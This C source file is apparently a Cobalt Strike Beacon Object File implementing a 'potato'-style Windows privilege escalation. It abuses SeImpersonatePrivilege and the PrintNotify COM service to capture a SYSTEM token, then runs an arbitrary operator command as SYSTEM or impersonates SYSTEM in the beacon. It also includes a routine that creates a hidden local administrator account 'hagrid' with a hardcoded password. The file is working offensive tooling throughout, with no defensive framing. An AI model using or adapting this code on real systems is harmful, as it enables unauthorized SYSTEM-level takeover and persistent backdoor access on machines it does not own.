#include <windows.h>
#include <stdio.h>
#include <objbase.h>
#include <ocidl.h>
#include <lm.h>
#include "bofdefs.h"
#include "beacon.h"

#define UNLEN 256

#define HANDLETOU(h) ((unsigned long)(ULONG_PTR)(h))
#define UTOHANDLE(h) ((void*)(UINT_PTR)(h))

DWORD token_value __attribute__((section (".data"))) = 0;

bool IsTokenSystem(HANDLE hToken)
{
	token_value = 0;
	DWORD Size, UserSize, DomainSize;
	SID* sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	SECURITY_IMPERSONATION_LEVEL ImpersonationLevel = SecurityAnonymous;
	wchar_t* impersonationLevelstr = NULL;

	PTOKEN_USER user;
	DWORD ret_len = 0;
	DWORD dwLength = 0;
	LPWSTR sid_name;
	ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, dwLength, &dwLength);
	if (KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER)
	{
		user = (PTOKEN_USER)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);
		if (user == NULL)
		{
			KERNEL32$CloseHandle(hToken);
			return NULL;
		}
	}
	if (ADVAPI32$GetTokenInformation(hToken, TokenUser, user, dwLength, &dwLength)) {
		sid = (SID*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);
		ADVAPI32$ConvertSidToStringSidW(user->User.Sid, &sid_name);
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "Error getting token user %d\n", KERNEL32$GetLastError());
	}
	Size = 0;
	ADVAPI32$GetTokenInformation(hToken, TokenImpersonationLevel, &ImpersonationLevel, sizeof(SECURITY_IMPERSONATION_LEVEL), &Size);

	switch (ImpersonationLevel)
	{
	case SecurityAnonymous:
		impersonationLevelstr = (wchar_t*)L"Anonymous"; break;
	case SecurityIdentification:
		impersonationLevelstr = (wchar_t*)L"Identification"; break;
	case SecurityImpersonation:
		impersonationLevelstr = (wchar_t*)L"Impersonation"; break;
	case SecurityDelegation:
		impersonationLevelstr = (wchar_t*)L"Delegation"; break;
	}
	if (!MSVCRT$wcscmp(sid_name, L"S-1-5-18") && ImpersonationLevel >= SecurityImpersonation) {
		BeaconPrintf(CALLBACK_OUTPUT, "Obtained SYSTEM (%ls) token with impersonation level: %S\n", sid_name, impersonationLevelstr);
		return TRUE;
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "Obtained (%ls) token with impersonation level: %S\n", sid_name, impersonationLevelstr);
		return FALSE;
	}
	return FALSE;
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!ADVAPI32$LookupPrivilegeValueA(NULL, priv, &luid)) {
		BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValue() failed, error %u\n", KERNEL32$GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		BeaconPrintf(CALLBACK_ERROR, "AdjustTokenPrivileges() failed, error %u\n", KERNEL32$GetLastError());
		return FALSE;
	}
	return TRUE;
}

//ref: https://www.codeproject.com/Articles/13601/COM-in-plain-C
typedef HRESULT STDMETHODCALLTYPE QueryInterfacePtr(IUnknown*, REFIID, void**);
typedef ULONG STDMETHODCALLTYPE AddRefPtr(IUnknown*);
typedef ULONG STDMETHODCALLTYPE ReleasePtr(IUnknown*);

typedef struct {
	QueryInterfacePtr* QueryInterface;
	AddRefPtr* AddRef;
	ReleasePtr* Release;
} IExampleVtbl;

typedef struct {
	IExampleVtbl* lpVtbl;
} IExample;

// Borrow from https://github.com/rapid7/metasploit-framework/blob/master/external/source/exploits/ntapphelpcachecontrol/exploit/CaptureImpersonationToken.cpp
HRESULT STDMETHODCALLTYPE QueryInterface(IUnknown* This, REFIID riid, void** ppvObj)
{
	HANDLE hToken_SYSTEM = UTOHANDLE(token_value);
	HANDLE* m_ptoken = &hToken_SYSTEM;

	if (*m_ptoken == NULL) {
		HRESULT hr = OLE32$CoImpersonateClient();
		if (SUCCEEDED(hr)) {
			HANDLE hToken;
			if (ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), MAXIMUM_ALLOWED, FALSE, &hToken)) {
				PTOKEN_USER user;
				DWORD ret_len = 0;
				DWORD dwLength = 0;
				ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, dwLength, &dwLength);
				if (KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
					user = (PTOKEN_USER)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);
					if (user == NULL) {
						KERNEL32$CloseHandle(hToken);
						return NULL;
					}
				}

				if((*m_ptoken == NULL)) {
					*m_ptoken = hToken;
					token_value = HANDLETOU(*m_ptoken);
				}
				else {
					KERNEL32$CloseHandle(hToken);
				}
			}
			else {
				BeaconPrintf(CALLBACK_ERROR, "Error opening token %d\n", KERNEL32$GetLastError());
			}
		}
	}

	CLSID CLSID_IUnknown;
	wchar_t* szCLSID_IUnknown = L"{00000000-0000-0000-C000-000000000046}";
	OLE32$CLSIDFromString(szCLSID_IUnknown, &CLSID_IUnknown);
	if (OLE32$IsEqualGUID(riid, CLSID_IUnknown)) {
		*ppvObj = This;
	}
	else {
		*ppvObj = NULL;
		return E_NOINTERFACE;
	}

	return NOERROR;
}

ULONG STDMETHODCALLTYPE AddRef(IUnknown* This) { return 1; }

ULONG STDMETHODCALLTYPE Release(IUnknown* This) { return 1; }


// borrow from MultiPotato
bool CreateAdminUser()
{
	LPWSTR username = (LPWSTR)L"hagrid";
	LPWSTR password = (LPWSTR)L"P@ss@29hagr!d";

	USER_INFO_1 ui;
	DWORD dwLevel = 1;
	DWORD dwError = 0;
	DWORD nStatus;

	ui.usri1_name = username;
	ui.usri1_password = password;
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT;
	ui.usri1_script_path = NULL;

	nStatus = NETAPI32$NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, NULL);
	if (nStatus != 0) {
		BeaconPrintf(CALLBACK_ERROR, "NetUserAdd error: %d", nStatus);
		return false;
	}

	DWORD gStatus;
	LOCALGROUP_MEMBERS_INFO_3 gi;
	gi.lgrmi3_domainandname = ui.usri1_name;
	DWORD level = 3;
	DWORD totalentries = 1;

	nStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L"Administrators", level, (LPBYTE)&gi, totalentries);
	if (nStatus != 0) {
		BeaconPrintf(CALLBACK_ERROR, "NetLocalGroupAddMembers error: %d", nStatus);
		return false;
	}

	return true;
}

BOOL InitBackup()
{
	HANDLE hTokenCurrProc = NULL;
	BOOL flag = TRUE;

	ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ALL_ACCESS, &hTokenCurrProc);
	if(!EnablePriv(hTokenCurrProc, SE_IMPERSONATE_NAME)) {
		BeaconPrintf(CALLBACK_ERROR, "SeImpersonatePrivilege properly not held\n");
		flag = FALSE;
		goto _CleanUp;
	}

_CleanUp:
	KERNEL32$CloseHandle(hTokenCurrProc);
	return flag;
}


BOOL EnumConectPoint()
{
	BOOL flag = TRUE;
	bool backupInit = false;
	ULONG num = 1;
	HRESULT hr = 0;
	ULONG d = 0;
	IConnectionPoint* arr;

	CLSID CLSID_PrintNotifyService;
	CLSID CLSID_IUnknown;
	wchar_t* szCLSID_PrintNotifyService = L"{854A20FB-2D44-457D-992F-EF13785D2B51}";
	wchar_t* szCLSID_IUnknown = L"{00000000-0000-0000-C000-000000000046}";
	IUnknown* pUnkown = NULL;

    IConnectionPointContainer* svc = NULL;
	CLSID CLSID_IConnectionPointContainer;
	wchar_t* szCLSID_IConnectionPointContainer = L"{B196B284-BAB4-101A-B69C-00AA00341D07}";
	IEnumConnectionPoints* pEnumConnectionPoints;
    IExample* example;
	IExampleVtbl IExample_Vtbl;

    hr = OLE32$CoInitialize(NULL);
    if (FAILED(hr)) {
    	BeaconPrintf(CALLBACK_ERROR, "CoInitialize fail, Error: 0x%08lx\n", hr);
        if (BeaconIsAdmin()) {
        	BeaconPrintf(CALLBACK_OUTPUT, "Attempt to initialize with CoInitializeEx alternatively\n");
            hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
            if (FAILED(hr)) {
            	BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx fail, Error: 0x%08lx\n", hr);
            }
           	backupInit = true;
		    }
    }

    if (!backupInit) {
    	hr = OLE32$CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL);
        if (hr != S_OK) {
        	BeaconPrintf(CALLBACK_ERROR, "CoInitializeSecurity fail, Error: 0x%08lx\n", hr);
            flag = FALSE;
            goto _CleanUp;
		}
    }

	OLE32$CLSIDFromString(szCLSID_PrintNotifyService, &CLSID_PrintNotifyService);
	OLE32$CLSIDFromString(szCLSID_IUnknown, &CLSID_IUnknown);

	hr = OLE32$CoCreateInstance(CLSID_PrintNotifyService, NULL, 4, CLSID_IUnknown, (void**)&pUnkown);
	if (hr != S_OK) {
		BeaconPrintf(CALLBACK_ERROR, "CoCreateInstance fail, Error: 0x%08lx\n", hr);
		flag = FALSE;
		goto _CleanUp;
	}

	OLE32$CLSIDFromString(szCLSID_IConnectionPointContainer, &CLSID_IConnectionPointContainer);
	hr = pUnkown->QueryInterface(CLSID_IConnectionPointContainer, (LPVOID*)&svc);
	if (hr != S_OK) {
		BeaconPrintf(CALLBACK_ERROR, "QueryInterface fail, Error: 0x%08lx\n", hr);
		flag = FALSE;
		goto _CleanUp;
	}

	hr = svc->EnumConnectionPoints(&pEnumConnectionPoints);
	if (hr != S_OK) {
		BeaconPrintf(CALLBACK_ERROR, "EnumConnectionPoints fail, Error: 0x%08lx\n", hr);
		flag = FALSE;
		goto _CleanUp;
	}
	svc->Release();

	hr = pEnumConnectionPoints->Next(num, &arr, (ULONG*)(&d));

	if (hr != S_OK) {
		BeaconPrintf(CALLBACK_ERROR, "Next fail, Error: 0x%08lx\n", hr);
		flag = FALSE;
		goto _CleanUp;
	}

	example = (IExample*)KERNEL32$GlobalAlloc(GMEM_FIXED, sizeof(IExample));
	IExample_Vtbl = { QueryInterface, AddRef, Release };
	example->lpVtbl = &IExample_Vtbl;
	do {
		if (arr != NULL)
		{
			arr->Advise((IUnknown*)example, &d);
			break;
		}
		hr = pEnumConnectionPoints->Next(num, &arr, (ULONG*)(&d));
	} while (hr == 0);

_CleanUp:
	OLE32$CoUninitialize();
	return flag;
}


VOID GetHigh(wchar_t* wProcessPath, wchar_t* wCommandLine, int method)
{
	HANDLE hTokenLogon = NULL;
	HANDLE hToken_SYSTEM = NULL;

	SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    STARTUPINFOW startupInfo = { 0 };
    PROCESS_INFORMATION processInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);

	if(!InitBackup())
		goto _CleanUp;

	if (!ADVAPI32$LogonUserA("A", "A", "A", LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hTokenLogon) || !BeaconUseToken(hTokenLogon)) {
		BeaconPrintf(CALLBACK_ERROR, "LogonUser and impersonate failed: %d\n", KERNEL32$GetLastError());
		goto _CleanUp;
	}

	if(!EnumConectPoint())
		goto _CleanUp;

	hToken_SYSTEM = UTOHANDLE(token_value);

	if (!IsTokenSystem(hToken_SYSTEM)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to obtain SYSTEM token with proper impersonate level!");
		goto _CleanUp;
	}

	if (method == 2) {
		//According to document, the process that calls the CreateProcessAsUser function must have the SE_INCREASE_QUOTA_NAME privilege and may require the SE_ASSIGNPRIMARYTOKEN_NAME privilege if the token is not assignable.
		EnablePriv(hToken_SYSTEM, SE_INCREASE_QUOTA_NAME);
		EnablePriv(hToken_SYSTEM, SE_ASSIGNPRIMARYTOKEN_NAME);
		BeaconUseToken(hToken_SYSTEM);
		if (!ADVAPI32$CreateProcessAsUserW(hToken_SYSTEM, wProcessPath, wCommandLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo)) {
			BeaconPrintf(CALLBACK_ERROR, "CreateProcessAsUserW failed: %d\n", KERNEL32$GetLastError());
			goto _CleanUp;
		}
		BeaconPrintf(CALLBACK_OUTPUT, "Command executed with CreateProcessAsUserW successfully\n");
	}
	else if (method == 3) {
		BeaconUseToken(hToken_SYSTEM);
		if (CreateAdminUser())
			BeaconPrintf(CALLBACK_OUTPUT, "User hagrid with password P@ss@29hagr!d has been added into administrators");
		goto _CleanUp;
	}
	else{
		if (!ADVAPI32$CreateProcessWithTokenW(hToken_SYSTEM, 0, wProcessPath, wCommandLine, CREATE_NO_WINDOW, 0, NULL, &startupInfo, &processInfo)) {
			BeaconPrintf(CALLBACK_ERROR, "CreateProcessWithTokenW failed: %d\n", KERNEL32$GetLastError());
			goto _CleanUp;
		}
		BeaconPrintf(CALLBACK_OUTPUT, "Command executed with CreateProcessWithTokenW successfully\n");
	}

_CleanUp:
	BeaconRevertToken();
	if(hTokenLogon)   KERNEL32$CloseHandle(hTokenLogon);
	if(hToken_SYSTEM) KERNEL32$CloseHandle(hToken_SYSTEM);
}


void go(char* args, int alen)
{
	datap parser;
	BeaconDataParse(&parser, args, alen);
	ULONG useToken  = BeaconDataInt(&parser);
	WCHAR* wCmdline = (WCHAR*) BeaconDataExtract(&parser, NULL);

	HANDLE hToken_SYSTEM = NULL;
	HANDLE hTokenLogon   = NULL;

	SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    STARTUPINFOW startupInfo = { 0 };
    PROCESS_INFORMATION processInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);

	if(!InitBackup())
		return;

	if (!ADVAPI32$LogonUserA("A", "A", "A", LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hTokenLogon) || !BeaconUseToken(hTokenLogon)) {
		BeaconPrintf(CALLBACK_ERROR, "LogonUser and impersonate failed: %d\n", KERNEL32$GetLastError());
		goto _CleanUp;
	}

	if(!EnumConectPoint())
		goto _CleanUp;

	hToken_SYSTEM = UTOHANDLE(token_value);

	if (!IsTokenSystem(hToken_SYSTEM)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to obtain SYSTEM token with proper impersonate level!");
		goto _CleanUp;
	}

	if (useToken) {
		BeaconUseToken(hToken_SYSTEM);
		BeaconOutput(CALLBACK_OUTPUT, "Impersonate to SYSTEM succeeded", 32);
		if(hTokenLogon) KERNEL32$CloseHandle(hTokenLogon);
		return;
	}
	else {
		if (!ADVAPI32$CreateProcessWithTokenW(hToken_SYSTEM, 0, NULL, wCmdline, CREATE_NO_WINDOW, 0, NULL, &startupInfo, &processInfo)) {
			EnablePriv(hToken_SYSTEM, SE_INCREASE_QUOTA_NAME);
			EnablePriv(hToken_SYSTEM, SE_ASSIGNPRIMARYTOKEN_NAME);
			BeaconUseToken(hToken_SYSTEM);
			if (!ADVAPI32$CreateProcessAsUserW(hToken_SYSTEM, NULL, wCmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo)) {
				BeaconPrintf(CALLBACK_ERROR, "CreateProcessWithTokenW & CreateProcessAsUserW failed: %d\n", KERNEL32$GetLastError());
				goto _CleanUp;
			} else {
				BeaconPrintf(CALLBACK_OUTPUT, "Command executed with CreateProcessAsUserW successfully\n");
			}
		}
		else {
			BeaconPrintf(CALLBACK_OUTPUT, "Command executed with CreateProcessWithTokenW successfully\n");
		}
	}

_CleanUp:
	BeaconRevertToken();
	if(hTokenLogon)   KERNEL32$CloseHandle(hTokenLogon);
	if(hToken_SYSTEM) KERNEL32$CloseHandle(hToken_SYSTEM);
}